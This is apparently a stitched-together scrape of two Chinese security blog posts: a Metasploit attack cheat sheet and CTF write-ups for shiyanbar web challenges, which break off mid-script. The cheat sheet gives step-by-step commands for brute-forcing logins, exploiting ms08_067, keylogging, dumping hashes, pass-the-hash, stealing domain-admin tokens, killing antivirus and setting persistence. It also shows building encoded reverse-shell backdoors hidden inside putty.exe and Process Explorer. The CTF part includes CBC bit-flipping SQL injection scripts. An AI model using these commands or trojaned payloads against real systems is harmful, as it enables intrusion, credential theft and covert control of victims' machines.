1、攻击第一步：基础信息收集  \n①whois 查询：  \nmsf > whois example.com  \nmsf> whois 192.168.1.100  \n\n②在线手机服务器IP工具  \n\n③nslookup  \nset type=mx  \nexample.com  \n\n##### 2、用nmap 探测开放端口和服务：  \n\n-sS SYN 半开扫描  \n-sT TCP 半开扫描  \n-Pn 不使用ping方式探测主机  \n-A 探测服务类型  \n-6 开启IPV6 扫描  \n-O 探测操作系统版本  \n\n常用扫描参数组合：  \nnmap –sS –Pn 192.168.0.111   \nnmap –sS –Pn –A 192.168.0.111   \n\n##### 3、MSF 与postgresql 协同工作  \n/etc/init.d/postgreql-8.3 start   \nmsf> db_connect postgres:toor@127.0.0.1/msf   \nmsf> db_status   \n导入nmap 扫描的结果：   \nnmap –sS –Pn –A –oX Subnet1 192.168.1.0/24 #   -oX 扫描结果导出为Subnet1.xml   \n\nmsf> db_import Subnet1.xml  \n\nmsf> db_hosts –c address #查看导入的主机IP  \n（msf 也可以和mysql 一起工作，在bt5 r1 中msf 默认支持连接mysql：  \nmsf> db_driver mysql   \nmsf> db_connect root:toor@127.0.0.1/msf3    #连接本机mysql 的msf3 数据库   \nmysql 默认密码toor，使用db_connect连接时会自动创建msf3 库）\n\n##### 4、高级扫描方式：    \n①msf> use auxiliary/scanner/ip/ipidseq #IPID 序列扫描器，与nmap 的-sI -O 选项类似  \nshow options  \nset RHOSTS 192.168.1.0/24  \nset RPORT 8080  \nset THREADS 50  \nrun  （RHOSTS、RPORT 等参数也可以用小写）  \n②msf> nmap –PN –sI 192.168.1.09 192.168.1.155  \n③nmap 连接数据库：  \nmsf> db_connect postgres:toor@127.0.0.1/msf  \nmsf> db_nmap –sS –A 192.168.1.111  \nmsf> db_services #查看扫描结果  \n④使用portscan 模块：  \nmsf> search postscan  \nmsf> use scanner/postscan/syn  \nset RHOSTS 192.168.1.111  \nset THREADS 50  \nrun  \n\n##### 5、特定扫描：  \nsmb_version 模块：   \nmsf> use auxiliary/scanner/smb/smb_version  \nshow options  \nset RHOSTS 192.168.1.111   \nrun   \ndb_hosts –c address,os_flavor  \n查找mssql 主机：      \nmsf> use auxiliary/scanner/mssql/mssql_ping  \nshow options  \nset RHOSTS 192.168.1.0/24  \nset THREADS 255  \nrun  \n\nSSH 服务器扫描：   \nmsf> use auxiliary/scanner/ssh/ssh_version   \nset THREADS 50  \nrun   \n\nFTP 主机扫描：  \nmsf> use auxiliary/scanner/ftp/ftp_version\nshow options\nset RHOSTS 192.168.1.0/24   \nset THREADS 255   \nrun   \n\n扫描FTP 匿名登录：   \nuse auxiliary/scanner/ftp/anonymos   \nset RHOSTS 192.168.1.0/24   \nset THREADS 50  \nrun   \n\n扫描SNMP 主机：  \nmsf> use auxiliary/scanner/snmp/snmp_login   \nset RHOSTS 192.168.1.0/24  \nset THREADS 50  \nrun  \n\n#### 四．基本漏洞扫描   \n##### 1、使用nc与目标端口通信，获取目标端口的信息：  \nnc 192.168.1.111 80  \nGET HTTP 1/1  \nServer: Microsoft-IIS/5.1  \n（1：还有一个功能与nc 类似的工具Ncat，产自nmap 社区，可实现相同功能：  \nncat -C 192.168.1.111 80  \nGET / HTTP/1.0  \n\n2：题外：ncat   还可以做聊天服务器呢！在服务器端监听然后多个客户端直接连上就可以聊天了：服务器（chatserver）：ncatncat -l –chat 其他客户端：ncat chatserver   \n\n3：ncat 还可以用来查看各种客户端的请求信息，比如论坛里有人问中国菜刀有木有后门，那么可以这样查看中国菜刀连接后门时发送的数据：  \n服务器（server.example.com）上：  \nncat -l   –keep-open 80 –output caidao.log > /dev/null  \n然后使用菜刀连接http://server.example.com/nc.php 并请求操作，这是菜刀发送的数据就保存到服务器的caidao.log里面了。也可以导出为hex格式，–output 换为–hex-dump就可以了。  \n\n4：其实与nc 功能类似的工具在kali里面还有很多，比如还有一个sbd：  \n监听：sbd -l -p 12345  \n连接：sbd 192.168.1.111 12345  \n\n5：当然也可以用来聊天，与ncat的不同之处在于ncat 自动对用户编号user1、user2、…，而sbd可以自定义昵称，且不需要专门单独监听为聊天服务器：  \npc1：sbd -l -p 12345 -P chowner  \npc2：sbd pc1 12345 -P evil  \n\n6：其实nc 也可以用来聊天的：  \npc1：nc -l -p 12345  \npc2:telnet pc1 12345）  \n\n##### 3、与nessus 结合扫描：\n使用Nessus 扫描完成后生成.nessus格式的报告，导入到MSF：  \ndb_connect postgres:toor@127.0.0.1/msf  \ndb_import /tmp/nessus_report_Host_test.nessus  \ndb_hosts –c address,svcs,vulns  \ndb_vulns  \n在MSF 中使用Nessus：  \ndb_connect postgres:toor@127.0.0.1/msf  \nload nessus  \nnessus_connect nessus:toor@192.168.1.111:8834   ok\nnessus_policy_list #查看存在的扫描规则  \nnessus_scan_new 2 bridge_scan 192.168.1.111 #2 表示规则的ID 号，bridge_scan 自定义扫描名称  \nnessus_scan_status #查看扫描进行状态  \nnessus_report_list #查看扫描结果  \nnessus_report_get skjla243-3b5d-* #导入报告  \ndb_hosts –c address,svcs,vulns  \n\n##### 4、特殊扫描：\n\nSMB 弱口令:  \nmsf> use auxiliary/scanner/smb/smb_login  \nset RHOSTS 192.168.1.111-222  \nset SMBUser Administrator  \nset SMBPass admin  \nrun  \n\nVNC 空口令：  \nmsf> use auxiliary/scanner/vnc/vnc_none_auth  \nset RHOSTS 192.168.1.111  \nrun  \n\nOpen X11 空口令：   \nmsf> use auxiliary/scanner/x11/open_x11  \nset RHOST 192.168.1.0/24  \nset THREADS 50  \nrun  \n\n当扫描到此漏洞的主机后可以使用xspy工具来监视对方的键盘输入：   \ncd /pentest/sniffers/xspy/  \n./xspy –display 192.168.1.125:0 –delay 100  \n\n#### 五．基础溢出命令\n##### 1、基本命令：  \n查看可用溢出模块show exploits  \n查看辅助模块show auxiliary    包括扫描器，拒绝服务模块，fuzzer 工具或其他   \n查看可用选项show options  \n\n加载模块后退出此模块back  \n例子：  \nmsf> use windows/smb/ms08_067_netapi  \nback  \n\n搜索模块search  \n例子： searh mssql search ms08_067  \n查看当前模块可用的payload： show payloads  \n例子：  \nuse windows/smb/ms08_067_netapi  \nshow payloads  \nset payload windows/shell/reverse_tcp  \nshow options  \n**查看可选的目标类型**show targets  \n**查看更多信息**info  \n设置一个选项或取消设置set/unset  \n设置或取消全局选项setg/unsetg 例如设置LHOST 就可以用setg，避免后面重复设置  \n保存全局选项的设置save 当下次启动仍然生效  \n查看建立的session sessions –l  \n激活session sessions –i num #num 为session 编号  \n\n##### 2、暴力端口探测：\n当主机端口对外开放但是普通探测方法无法探测到时，用此模块，msf将对目标的所有端口进行尝试，直到找到一个开放端口并与测试者建立连接。  \n例子：  \nuse exploit/windows/smb/ms08_067_netapi  \nset LHOST 192.168.1.111  \nset RHOST 192.168.1.122  \nset TARGET 39 #Windows XP SP3 Chinese -Simplified (NX)  \nsearch ports #搜索与ports 相关模块  \nset PAYLOAD windows/meterpreter/reverse_tcp_allports  \nexploit –j #作为后台任务运行  \nsessions –l –v  \nsesssions –i 1   \n \n##### 3、MSF 脚本文件：   \n为了缩短测试时间可以将msf命令写入一个文件，然后在msf 中加载它。加载方式：msfconsole 的resource 命令或者msfconsole 加上-r 选项  \n \n#### 六．METERPRETER\n##### 1、当对目标系统进行溢出时，使用meterpreter 作为payload，给测试者返回一个shell，可用于在目标机器上执行更多的操作。  \n例子：  \nmsf> nmap –sT –A –P0 192.168.1.130   #探测开放服务  \n假如已经探测到1433（TCP）和1434(UDP)端口（mssql），  \nmsf> nmap –sU 192.168.1.130 –P 1434   #确认端口开放  \nmsf> use auxiliary/scanner/mssql/mssql_ping  \nshow options  \nset RHOSTS 192.168.1.1/24  \nset THREADS 20  \nexploit  \n至此可获取服务器名称，版本号等信息。  \nmsf> use auxiliary/scanner/mssql/mssql_login\nshow options  \nset PASS_FILE   /pentest/exploits/fasttrack/bin/dict/wordlist.txt  \nset RHOSTS 192.168.1.130  \nset THREADS 10  \nset verbose false  \nexploit  \n暴力猜解登陆密码。接下来使用mssql自带的xp_cmdshell 功能添加账户：  \nmsf> use exploit/windows/mssql/mssql_payload\nshow options   \nset payload windows/meterpreter/reverse_tcp  \nset LHOST 192.168.1.111  \nset LPORT 433  \nset RHOST 192.168.1.130  \nset PASSWORD password130  \nexploit   \n当获取到一个meterpreter shell后可以执行更多的操作：获取屏幕截图：screenshot  \n获取系统信息：sysinfo  \n获取键盘记录：\nmeterpreter> ps   \n\n#查看目标机器进程，假设发现explorer.exe的进程号为1668:    \nmeterpreter> migrate 1668 #插入该进程  \nmeterpreter> run   post/windows/capture/keylog_recorder #运行键盘记录模块，将击键记录保存到本地txt  \ncat /root/.msf3/loot/*.txt #查看结果  \n\n获取系统账号密码：  \nmeterpreter> use priv  \nmeterpreter> run post/windows/gather/hashdump\n当获取到密码的hash之后无法破解出明文密码且无法直接使用hash 登陆，需要使用pass-the-hash 技术  ：  \nmsf> use windows/smb/psexec  \nset PAYLOAD windows/meterpreter/reverse_tcp  \nset LHOST 192.168.1.111  \nset LPORT 443  \nset RHOST 192.168.1.130  \nset SMBPass aad3b435b51404eeaad3b435b51404ee:b75989f65d1e04af7625ed712ac36c29   \nexploit  \n获取到系统权限后我们可以新建一个普通账号，然后使用此账号执行我们的后门：  \n\n在目标机器上执行：net uaer hacker pass /add   \n本地生成一个后门程序：  \nmsfpayload windows/meterpreter/reverse_tcp\nLHOST=192.168.1.111 LPORT=443 X >payload.exe   \n将payload.exe拷贝到目标机器然后使用新建立的账号执行本地执行端口监听，等待来自目标机器连接：   \nmsfcli multi/handler    PAYLOAD=windows/meterpreter/reverse_tcp   \nLHOST=192.168.1.111 LPORT=443   \nuse priv  \ngetsystem  \ngetuid  \n至此取得SYSTEM 权限   \n\n##### 2、令牌模拟：当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限，之后登陆其他机器时不需要登陆密码。  \nmeterpreter> ps #    查看目标机器进程，找出域控账户运行的进程ID，假如发现PID 为380  \nmeterpreter> steal_token 380  \n有时ps 命令列出的进程中可能不存在域控账户的进程，此时使用incognito 模块查看可用token：   \nmeterpreter> use incognito   \nmeterpreter> list_tokens –u    #列出可用token，假如找到域控token  \nmeterpreter> impersonate_token    SNEAKS.IN\\ihazdomainadmin   \nmeterpreter> add_user hacker password –h 192.168.1.50 #在域控主机上添加账户   \nmeterpreter> add_group_user “Domain Admins” hacker –h 192.168.1.50 #将账户添加至域管理员组   \n\n##### 3、内网渗透：当取得同网段内一台主机的权限后可以进一步渗透网内其他主机：\n例子：  \nmeterpreter> run get_local_subnets #查看网段/子网  \nLocal subnet: 192.168.33.0/255.255.255.0\nmeterpreter> background #转入后台运行  \nmsf> route add 192.168.33.0 255.255.255.0 1 #本地添加路由信息   \nmsf> route print #查看添加的信息   \nmsf> use linux/samba/lsa_transnames_heap #准备向内网目标主机进攻   \nset payload linux/x86/shell/reverse_tcp\nset LHOST 10.10.1.129 #此处为attacking 主机的外网IP   \nset LPORT 8080  \nset RHOST 192.168.33.132 #内网目标主机  \nexploit  \n也可以使用自动式添加路由模块：  \nmsf> load auto_add_route  \nmsf> exploit  \n\n##### 4、Meterpreter 脚本：  \n使用run scriptname 方式执行  \n①vnc 脚本,获取远程机器vnc 界面控制   \nmeterpreter> run vnc   \nmeterpreter> run screen_unlock  \n②进程迁移  \n当攻击成功后将连接进程从不稳定进程（如使用浏览器溢出漏洞exp   进行攻击时浏览器可能会被目标关闭）迁移至稳定进程(explorer.exe)，保持可连接。  \n例子：  \nmeterpreter> run post/windows/manage/migrate  \n（在64 位win7 中migrate需要管理员权限执行后门才能成功，而migrate 前后获取的权限是有差异的。）  \n③关闭杀毒软件  \nmeterpreter> run killav   （这个脚本要小心使用，可能导致目标机器蓝屏死机。）  \n④获取系统密码hash  \nmeterpreter> run hashdump  \n（64 位win7 下需要管理员权限执行后门且先getsystem，然后使用run post/windows/gather/hashdump 来dump hash 成功率更高。而且如果要使用shell 添加系统账户的话win7 下得先：  \nrun post/windows/escalate/bypassuac ，不然可能不会成功。）  \n⑤获取系统流量数据  \nmeterpreter> run packtrecorder –i 1   \n⑥直捣黄龙   \n可以干很多事情：获取密码，下载注册表，获取系统信息等   \nmeterpreter> run scraper   \n⑦持久保持  \n当目标机器重启之后仍然可以控制   \nmeterpreter> run persistence –X –i 50 –p 443 –r 192.168.1.111   \n-X 开机启动-i 连接超时时间–p 端口–rIP   \n下次连接时：  \nmsf> use multi/handler  \nset payload windows/meterpreter/reverse_tcp  \nset LPOST 443  \nset LHOST 192.168.1.111  \nexploit   \n(会在以下位置和注册表以随机文件名写入文件等信息，如：  \nC:\\Users\\YourtUserName\\AppData\\Local\\Temp\\MXIxVNCy.vbs  \nC:\\Users\\YourtUserName\\AppData\\Local\\Temp\\radF871B.tmp\\svchost.exe  \nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DjMzwzCDaoIcgNP)  \n⑧POST 整合模块  \n可实现同时多个session 操作   \n例子：获取hash  \nmeterpreter> run post/windows/gather/hashdump  \n其他还有很多，使用TAB 键补全看下就知道run post/   \n\n##### 5、升级command shell\n例子：  \nmsfconsole    \nmsf> search ms08_067  \nmsf> use windows/smb/ms08_067_netapi  \nset PAYLOAD windows/shell/reverse_tcp   \nset TARGET 3  \nsetg LHOST 192.168.1.111  \nsetg LPORT 8080  \nexploit –z #后台运行，如果此处未使用-z参数，后面可以按CTRL-Z 转到后台    \nsessions –u 1 #升级shell，必须前面使用setg 设定\nsessions –i 2   \n\n##### 6、使用Railgun 操作windows APIs  \n例子：   \nmeterpreter> irb   \n\n client.railgun.user32.MessageBoxA(o,”hello”,”world”,”MB_OK”)  \n在目标机器上会弹出一个标题栏为world和内容为hello 的窗口  \n\n#### 七．避开杀软  \n##### 1、使用msfpayload 创建可执行后门：  \n例子：   \nmsfpayload windows/shell_reverse_tcp 0 #查看选项    \nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 X >\n/var/www/payload1.exe   \n然后本机监听端口   \nmsf> use exploit/multi/handler  \nshow options   \nset PAYLOAD windows/shell_reverse_tcp   \nset LHOST 192.168.1.111  \nset LPORT 31337   \nexploit   \n\n##### 2、过杀软—使用msfencode 编码后门：  \nmsfencode –l #列出可用编码器  \n例子：   \nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=31337 R\n|msfencode –e x86/shikata_ga_nai –t exe > /var/www/payload2.exe     \n使用R 参数作为raw 输出至管道，再经过msfencode 处理，最后导出。   \n\n##### 3、多次编码：  \n例子：   \nmsfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.111 LPORT=31337 R |\nmsfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/alpha_upper –c 2 –t raw |\nmsfencode –e x86/shikata_ga_nai –c 5 –t raw | msfencode –e x86/countdown –c 5 –t exe –o\n/var/www/payload3.exe    \n简单编码被杀机会很大，使用多次编码效果更好，这里一共使用了17 次循环编码。  \n\n \n##### 4、自定义可执行程序模板：  \nmsfencode 默认使用data/templates/templates.exe（msf v4 在templates 目录下有针对不同平台的不同模板）作为可执行程序的模板，杀毒厂商也不是傻逼，所以这里最好使用自定义模板，如：  \nwget http://download.sysinternals.com/Files/ProcessExplorer.zip  \ncd work  \nunzip ProcessExplorer.zip  \ncd ..    \nmsfpayload windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=8080 R | msfencode\n–t exe –x work/procexp.exe –o/var/www/pe_backdoor.exe –e x86/shikata_ga_nai –c 5   \n在目标机器上运行，然后本地使用msfcli监听端口等待反弹连接：   \nmsfcli exploit/multi/handler   PAYLOAD=windows/shell_reverse_tcp   LHOST=192.168.1.111  \nLPORT=8080 E  \n\n##### 5、暗度陈仓—猥琐执行payload：\n绑定payload 至一个可执行文件，让目标不知不觉间中招，以putty.exe 为例：  \nmsfpayload windows/shell_reverse_tcp   LHOST=192.168.1.111 LPORT=8080 R | msfencode\n–t exe –x putty.exe -o    /var/www/putty_backdoor.exe –e   x86/shikata_ga_nai –k –c 5  \n假如选择一个GUI界面的程序作为绑定目标并且不使用-k 选项，则目标执行此程序的时候不会弹出cmd窗口，-k 选项的作用是payload独立于模板软件的进程运行。   \n\n","tags":["MSF"]},{"title":"实验吧ctf题小计","url":"/2018/06/01/实验吧小计/","content":"### 实验吧ctf题小计  \n#### 天下武功唯快不破  \n这道题给出提示  \nThere is no martial art is indefectible, while the fastest speed is the only way for long success.  \nYou must do it as fast as you can!   \n审查元素发现注释  \n please post what you find with parameter:key   \n 也就是我们需要post传参一个key值得到flag  \n bp抓包看一下\n ![image](http://wx2.sinaimg.cn/mw690/0060lm7Tly1frumcoseeqj310z09s40n.jpg)  \n 响应头中有FLAGbase64编码，但是发现每一次请求都会改变base64值，所以我们需要写一个小脚本来快速抓取FLAG解码再post传参  \n ```\n # -*- coding: utf-8 -*\nimport requests\nimport base64\n\nr= requests.get(\"http://ctf5.shiyanbar.com/web/10/10.php\")\nr=r.headers.get('FLAG')\nr=base64.b64decode(r)\nprint r[25:34]\nd = {'key':r[25:34]}\nr = requests.post(\"http://ctf5.shiyanbar.com/web/10/10.php\", data=d)\nprint r.text\n ```\n 得到flag： CTF{Y0U_4R3_1NCR3D1BL3_F4ST!}\n#### what a fuck!这是什么鬼东西?\n打开得到一坨[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!。。。。  \n这是JSFuck编码  \n```\n    false       =>  ![]\n    true        =>  !![]\n    undefined   =>  [][[]]\n    NaN         =>  +[![]]\n    0           =>  +[]\n    1           =>  +!+[]\n    2           =>  !+[]+!+[]\n    10          =>  [+!+[]]+[+[]]\n    Array       =>  []\n    Number      =>  +[]\n    String      =>  []+[]\n    Boolean     =>  ![]\n    Function    =>  [][\"filter\"]\n    eval        =>  [][\"filter\"][\"constructor\"]( CODE )()\n    window      =>  [][\"filter\"][\"constructor\"](\"return this\")()\n\n```\n[在线网站](http://www.bugku.com/tools/jsfuck/)解码得到flag：Ihatejs  \n#### 拐弯抹角  \n```\n <?php\n// code by SEC@USTC\n\necho '<html><head><meta http-equiv=\"charset\" content=\"gbk\"></head><body>';\n\n$URL = $_SERVER['REQUEST_URI'];\n//echo 'URL: '.$URL.'<br/>';\n$flag = \"CTF{???}\";\n\n$code = str_replace($flag, 'CTF{???}', file_get_contents('./index.php'));\\\\从index.php中读入一个字符串，再讲文件字符串中的flag变量值改变为CTF{???}\n$stop = 0;\n\n//这道题目本身也有教学的目的\n//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的\n//所以，第一个要求就是不得出现 ./\nif($flag && strpos($URL, './') !== FALSE){\n    $flag = \"\";\n    $stop = 1;        //Pass\n}\n\n//第二，我们可以构造 \\ 来代替被过滤的 /\n//所以，第二个要求就是不得出现 ../\nif($flag && strpos($URL, '\\\\') !== FALSE){\n    $flag = \"\";\n    $stop = 2;        //Pass\n}\n\n//第三，有的系统大小写通用，例如 indirectioN/\n//你也可以用?和#等等的字符绕过，这需要统一解决\n//所以，第三个要求对可以用的字符做了限制，a-z / 和 .\n$matches = array();\npreg_match('/^([0-9a-z\\/.]+)$/', $URL, $matches);\nif($flag && empty($matches) || $matches[1] != $URL){\n    $flag = \"\";\n    $stop = 3;        //Pass\n}\n\n//第四，多个 / 也是可以的\n//所以，第四个要求是不得出现 //\nif($flag && strpos($URL, '//') !== FALSE){\n    $flag = \"\";\n    $stop = 4;        //Pass\n}\n\n//第五，显然加上index.php或者减去index.php都是可以的\n//所以我们下一个要求就是必须包含/index.php，并且以此结尾\nif($flag && substr($URL, -10) !== '/index.php'){\n    $flag = \"\";\n    $stop = 5;        //Pass\n}\n\n//第六，我们知道在index.php后面加.也是可以的\n//所以我们禁止p后面出现.这个符号\nif($flag && strpos($URL, 'p.') !== FALSE){\n    $flag = \"\";\n    $stop = 6;        //Pass\n}\n\n//第七，现在是最关键的时刻\n//你的$URL必须与/indirection/index.php有所不同\nif($flag && $URL == '/indirection/index.php'){\n    $flag = \"\";\n    $stop = 7;        //Pass\n}\nif(!$stop) $stop = 8;\n\necho 'Flag: '.$flag;\necho '<hr />';\nfor($i = 1; $i < $stop; $i++)\n    $code = str_replace('//Pass '.$i, '//Pass', $code);\nfor(; $i < 8; $i++)\n    $code = str_replace('//Pass '.$i, '//Not Pass', $code);\n\n\necho highlight_string($code, TRUE);\n\necho '</body></html>'; \n```\n代码中要求要去访问index.php，但是不能直接使用/indirection/index.php访问，同时过滤了./\n、../、大小写绕过、//、文件后的. 、以及必须以/index.php结尾   \n在网上搜索了一下才知道可以利用伪静态技术，构造url：http://ctf5.shiyanbar.com/indirection/index.php/index.php  \n相当于服务器将第二个index.php当做参数处理了，服务器就只解析到第一个index.php  \nflag： CTF{PSEDUO_STATIC_DO_YOU_KNOW}   \n#### 简单的登录题  \n开始随便输入，然后bp抓包，发现tips：test.php   \n![image](http://wx1.sinaimg.cn/mw690/0060lm7Tly1fry0lfei0ij30yo09rq4n.jpg)  \n访问http://ctf5.shiyanbar.com/web/jiandan/test.php   \n得到源码  \n```\n\ndefine(\"SECRET_KEY\", '***********');\ndefine(\"METHOD\", \"aes-128-cbc\");\\\\想到cbc字节翻转攻击\nerror_reporting(0);\ninclude('conn.php');\nfunction sqliCheck($str){\\\\该函数对传入的变量进行过滤，防止SQL注入\n\tif(preg_match(\"/\\\\\\|,|-|#|=|~|union|like|procedure/i\",$str)){\n\t\treturn 1;\n\t}\n\treturn 0;\n}\nfunction get_random_iv(){\\\\该函数随机生产一个16位iv值\n    $random_iv='';\n    for($i=0;$i<16;$i++){\n        $random_iv.=chr(rand(1,255));\n    }\n    return $random_iv;\n}\nfunction login($info){\n\t$iv = get_random_iv();\n\t$plain = serialize($info);\\\\对传入的数组序列化\n    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);// 采用aes-128-cbc 方式加密序列化后的plain,返回原始或者base64编码后的字符串\n    setcookie(\"iv\", base64_encode($iv));//cookie 值为base64编码的iv\n    setcookie(\"cipher\", base64_encode($cipher));// cookie 值为bas64编码的值cipher\n}\nfunction show_homepage(){\n\tglobal $link;\n    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){\n        $cipher = base64_decode($_COOKIE['cipher']);\n        $iv = base64_decode($_COOKIE[\"iv\"]);// 解码cookie和iv，并解密得到plain\n        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){\n            $info = unserialize($plain) or die(\"<p>base64_decode('\".base64_encode($plain).\"') can't unserialize</p>\");\\\\这里的plain可能有两个值\n            $sql=\"select * from users limit \".$info['id'].\",0\";\n            $result=mysqli_query($link,$sql);\n            \n            if(mysqli_num_rows($result)>0  or die(mysqli_error($link))){\n            \t$rows=mysqli_fetch_array($result);\n\t\t\t\techo '<h1><center>Hello!'.$rows['username'].'</center></h1>';\n\t\t\t}\n\t\t\telse{\n\t\t\t\techo '<h1><center>Hello!</center></h1>';\n\t\t\t}\n        }else{\n            die(\"ERROR!\");\n        }\n    }\n}\nif(isset($_POST['id'])){\n    $id = (string)$_POST['id'];\n    if(sqliCheck($id))\\\\过滤非法参数  \n\t\tdie(\"<h1 style='color:red'><center>sql inject detected!</center></h1>\");\n    $info = array('id'=>$id);\n    login($info);\n    echo '<h1><center>Hello!</center></h1>';\n}else{\n    if(isset($_COOKIE[\"iv\"])&&isset($_COOKIE['cipher'])){\n        show_homepage();\n    }else{\n        echo '<body class=\"login-body\" style=\"margin:0 auto\">\n                <div id=\"wrapper\" style=\"margin:0 auto;width:800px;\">\n                    <form name=\"login-form\" class=\"login-form\" action=\"\" method=\"post\">\n                        <div class=\"header\">\n                        <h1>Login Form</h1>\n                        <span>input id to login</span>\n                        </div>\n                        <div class=\"content\">\n                        <input name=\"id\" type=\"text\" class=\"input id\" value=\"id\" onfocus=\"this.value=\\'\\'\" />\n                        </div>\n                        <div class=\"footer\">\n                        <p><input type=\"submit\" name=\"submit\" value=\"Login\" class=\"button\" /></p>\n                        </div>\n                    </form>\n                </div>\n            </body>';\n    }\n}\n```\n\n**遇到的问题**  \n- 需要进行SQL注入但是遇到了关键字过滤  \n```\n\"/\\\\\\|,|-|#|=|~|union|like|procedure/i\"\n```\n- SQL查询是id参数后面如何将后面的,0注释掉  \n- 见到aes-128-cbc自然想到cbc字节翻转攻击，那么怎么来利用     \n[参考文章](https://www.jianshu.com/p/4c1e5d24d781)   \n\n**解决方法**\n- 利用%00截断后面的,0 \n- 使用cbc翻转将lnion变为union绕过过滤(CBC翻转 关键在，初始化因子 xor 原文 xor 你想的字符串 得到 更改版的初始化因子)     \n\n##### **CBC字节翻转攻击**  \n[参考文章](http://www.freebuf.com/articles/system/163756.html)   \n加密过程：  \n![image](http://image.3001.net/images/20180228/15198072135832.png!small)   \nPlaintext：明文数据\n\nIV：初始向量\n\nKey：分组加密使用的密钥\n\nCiphertext：密文数据   \n解密过程：  \n每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。\n\n对于第一组则是与IV进行异或。    \n\n涉及名词：偏移量、php序列化、aes加密、异或\n\n**攻击过程：**   \n**对于解密时**：\n\n设明文为X，密文为Y，解密函数为k。\n\nX[i] = k(Y[i]) Xor Y[i-1]  \n**解密第一组时**：\n\nX[1]=k(Y[1]) Xor IV\n\n对于X[i]的解密时，X[i] = k(Y[i]) Xor Y[i-1]，k(Y[i])部分是无法控制的，假如修改Y[i]的值，是无法确定k(Y[i])的值，由于最后是异或操作，因此可以仅修改Y[i-1]的内容为Y’[i-1]来控制最后的明文的值，设解密后的内容为M[i]=k(Y[i]) Xor Y[i-1]。\n\n将Y[i-1]的值设置为Y[i-1] Xor M[i]的值，新的Y[i-1]的值用Y’[i-1]表示。\n\n那么X[i] = k(Y[i]) Xor Y’[i-1]=k(Y[i]) Xor Y[i-1] Xor M[i] = M[i] Xor M[i] = 0\n\n这样就能将只修改Y[i-1]的内容来控制X[i]的值\n\n而此时X[i-1]的值肯定就会出错了，设修改Y[i-1]的值，导致解密后X[i-1]的值为M[i-1]，那么将Y[i-2]的值改为Y[i-2]=Y[i-2] Xor M[i-1] Xor 任意值，可以使得X[i-1]=任意值\n\n这样循环往前，最后一组就是根据M[1]的值修改IV=IV Xor M[1] Xor 任意值，使得X[1]=任意值\n\n对于本题来说，cookie中储存了初始的iv和cipher,我们可以利用bp修改，在本题中也是一样，先获取cipher 对应的cookie，然后字节反转为我们想要的payload，代码如下：\n```\n# -*- coding:utf8 -*-\n__author__='pcat@chamd5.org'\nfrom base64 import *\nimport urllib\ncipher='sZMYZaZsCxj98IedEp83YeaXgk4TtWPbw6D5mhkzP1I%3D'\ncipher_raw=b64decode(urllib.unquote(cipher))\nlst=list(cipher_raw)\nidx=4\nc1='2'\nc2='#'\nlst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))\ncipher_new=''.join(lst)\ncipher_new=urllib.quote(b64encode(cipher_new))\nprint(cipher_new)\n```\n这里得到了新的cipher，下面利用返回的密文值和公式 C = A XOR B得到新的iv，代码如下：\n```\n# -*- coding:utf8 -*-\n__author__='pcat@chamd5.org'\nfrom base64 import *\nimport urllib\niv='Ko5zoC%2BklAcyqq%2BqihjbwA%3D%3D'\niv_raw=b64decode(urllib.unquote(iv))\nfirst='a:1:{s:2:\"id\";s:'\nplain=b64decode('g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9')\niv_new=''\nfor i in range(16):\niv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))\niv_new=urllib.quote(b64encode(iv_new))\nprint iv_new\n\n```\n上述的两个脚本就可以修改iv, cipher, 将id=12 的情况变成id=1#，最后的查询脚本如下：\n```\n# -*- coding:utf8 -*-\n# 请保留我的个人信息，谢谢~！\n__author__='pcat@chamd5.org'\nfrom base64 import *\nimport urllib\nimport requests\nimport re\n# 解码base64，获得iv,cipher的加密值\ndef mydecode(value):\nreturn b64decode(urllib.unquote(value))\n# 转码\ndef myencode(value):\nreturn urllib.quote(b64encode(value))\n# 字节反转：将指定偏移量的字符转换为新的字符\ndef mycbc(value,idx,c1,c2):\nlst=list(value)\nlst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))\nreturn ''.join(lst)\n# 提交payload，获取cookie，并将cookie 解密为iv，cipher，再使用字节反转攻击，使得sql 查询能够成功\ndef pcat(payload,idx,c1,c2):\nurl=r'http://ctf5.shiyanbar.com/web/jiandan/index.php'\nmyd={'id':payload}\nres=requests.post(url,data=myd)\ncookies=res.headers['Set-Cookie']\niv=re.findall(r'iv=(.*?),',cookies)[0]\ncipher=re.findall(r'cipher=(.*)',cookies)[0]\niv_raw=mydecode(iv)\ncipher_raw=mydecode(cipher)  \n# 字节反转，先转换cipher，得到aes加密的密文(非base64加密后得值)，再利用异或，求出随机生成得iv\ncipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))\ncookies_new={'iv':iv,'cipher':cipher_new}\ncont=requests.get(url,cookies=cookies_new).content\nplain=b64decode(re.findall(r\"base64_decode\\('(.*?)'\\)\",cont)[0])\nfirst='a:1:{s:2:\"id\";s:'\niv_new=''\nfor i in range(16):\niv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))\niv_new=myencode(iv_new)\n# 得到源码生产的随机值iv 和aes 加密得cipher，并且plain 明文在cbc字节反转下可控\ncookies_new={'iv':iv_new,'cipher':cipher_new}\ncont=requests.get(url,cookies=cookies_new).content\nprint 'Payload:%s\\n>> ' %(payload)\nprint cont\npass\n# 不断带入构造好的sql 语句，得到返回结果即可\ndef foo():\npcat('12',4,'2','#')\npcat('0 2nion select * from((select 1)a join (select 2)b join (select\n3)c);'+chr(0),6,'2','u')\npcat('0 2nion select * from((select 1)a join (select group_concat(table_name) from\ninformation_schema.tables where table_schema regexp database())b join 